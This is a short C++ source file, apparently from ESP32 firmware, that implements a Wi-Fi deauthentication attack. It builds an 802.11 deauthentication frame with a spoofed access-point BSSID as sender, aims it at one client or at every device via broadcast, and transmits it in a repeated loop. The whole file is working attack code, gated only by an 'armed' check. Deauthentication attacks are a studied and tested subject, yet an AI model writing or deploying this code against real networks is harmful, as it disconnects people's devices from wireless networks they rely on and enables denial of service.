#include "deauth.h"
#include "tx_arm.h"
#include "mac_utils.h"
#include <esp_wifi.h>

namespace Deauth {

bool send(const String &bssidStr, const String &clientStr, uint8_t channel, uint16_t frames) {
    if (!TxArm::isArmed()) return false;

    uint8_t bssid[6], client[6];
    if (!MacUtils::parse(bssidStr, bssid)) return false;
    if (clientStr.length() == 0 || !MacUtils::parse(clientStr, client)) {
        memcpy(client, MacUtils::BROADCAST, 6);
    }

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    uint8_t frame[26] = {
        0xC0, 0x00,       // frame control: deauthentication
        0x00, 0x00,       // duration
        0, 0, 0, 0, 0, 0, // addr1: destination (client, or broadcast)
        0, 0, 0, 0, 0, 0, // addr2: source (bssid)
        0, 0, 0, 0, 0, 0, // addr3: bssid
        0x00, 0x00,       // seq-ctl
        0x01, 0x00        // reason code: unspecified
    };
    memcpy(frame + 4, client, 6);
    memcpy(frame + 10, bssid, 6);
    memcpy(frame + 16, bssid, 6);

    for (uint16_t i = 0; i < frames; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, frame, sizeof(frame), false);
        delay(2);
    }
    return true;
}

} // namespace Deauth
